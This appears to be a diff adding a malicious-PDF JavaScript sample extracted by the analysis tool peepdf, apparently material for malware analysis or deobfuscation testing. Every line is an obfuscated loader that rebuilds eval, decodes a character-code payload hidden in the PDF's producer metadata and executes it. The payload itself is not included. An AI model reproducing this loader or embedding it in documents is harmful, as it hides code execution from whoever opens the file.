@@ -1,0 +1,29 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [() <</S /JavaScript
+/JS (
+var TumimUdoh='';
+var PuxYexe=this.producer.substr(0,4);
+for(var BiwubekOraca in this) {
+	if (BiwubekOraca=='PuxYexe')
+		Wunydyikuha=eval(BiwubekOraca.replace('PuxYex','')+'val');
+}
+acmRofzyca = Wunydyikuha('new Date(2007,2,51,2,12,5)');
+PydaqexoqefYjyhewiheg = 'thi'+acmRofzyca.getHours()+'ducer';
+KysexudihninYfajih=Wunydyikuha(PydaqexoqefYjyhewiheg.replace(2,'s.pro'));
+KysexudihninYfajih = KysexudihninYfajih.replace(/t/g,'2');
+BiyTec = KysexudihninYfajih.substr(4).split('s');
+var XizuPyjugoqywamafylix = '';
+g = acmRofzyca.getHours()*2;
+var JagAji = 'fro'+acmRofzyca.getHours()+'arCode';
+JagAji=JagAji.replace(2,'mCh');
+FijYz=String[JagAji];
+for (BiwubekOraca = 0; BiwubekOraca < BiyTec.length; BiwubekOraca++) {
+	QiqEcoj = Wunydyikuha(BiyTec[BiwubekOraca]);
+	XizuPyjugoqywamafylix += FijYz(QiqEcoj);
+}
+Wunydyikuha(XizuPyjugoqywamafylix);
+)
+>>]
+>>
+
